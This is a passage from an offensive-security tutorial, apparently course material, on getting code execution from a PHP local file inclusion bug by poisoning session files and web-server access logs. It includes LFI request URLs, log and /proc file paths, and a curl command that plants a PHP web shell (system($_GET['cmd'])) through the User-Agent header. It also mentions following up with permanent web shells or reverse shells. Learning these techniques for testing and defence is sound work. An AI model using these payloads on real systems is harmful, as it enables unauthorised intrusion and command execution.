We have seen in previous sections that if we include any file that contains PHP code, it will get executed, as long as the vulnerable function has the `Execute` privileges. The attacks we will discuss in this section all rely on the same concept: Writing PHP code in a field we control that gets logged into a log file (i.e. `poison`/`contaminate` the log file), and then include that log file to execute the PHP code. For this attack to work, the PHP web application should have read privileges over the logged files, which vary from one server to another

|**Function**|**Read Content**|**Execute**|**Remote URL**|

## PHP Session Poisoning

Most PHP web applications utilize `PHPSESSID` cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in `session` files on the back-end, and saved in `/var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\` on Windows. The name of the file that contains our user's data matches the name of our `PHPSESSID` cookie with the `sess_` prefix. For example, if the `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its location on disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.

```bash
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

As you may easily guess, the cookie value will differ from one session to another, so you need to use the cookie value you find in your own session to perform the same attack.

>To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.

## Server Log Poisoning

Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log`. The `access.log` file contains various information about all requests made to the server, including each request's `User-Agent` header. As we can control the `User-Agent` header in our requests, we can use it to poison the server logs as we did above.

Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs. `Nginx` logs are readable by low privileged users by default (e.g. `www-data`), while the `Apache` logs are only readable by users with high privileges (e.g. `root`/`adm` groups). However, in older or misconfigured `Apache` servers, these logs may be readable by low-privileged users.

By default, `Apache` logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows. However, the logs may be in a different location in some cases, so we may use an [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations, as will be discussed in the next section.

```bash
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```

As we can see, we can read the log. The log contains the `remote IP address`, `request page`, `response code`, and the `User-Agent` header. As mentioned earlier, the `User-Agent` header is controlled by us through the HTTP request headers, so we should be able to poison this value.

Logs tend to be huge, and loading them in an LFI vulnerability may take a while to load, or even crash the server in worst-case scenarios. So, be careful and efficient with them in a production environment, and don't send unnecessary requests.

To do so, we will use `Burp Suite` to intercept our earlier LFI request and modify the `User-Agent` header to `Apache Log Poisoning`:

```shell
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
```

```shell
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

**Tip:** The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.

Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:

- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`
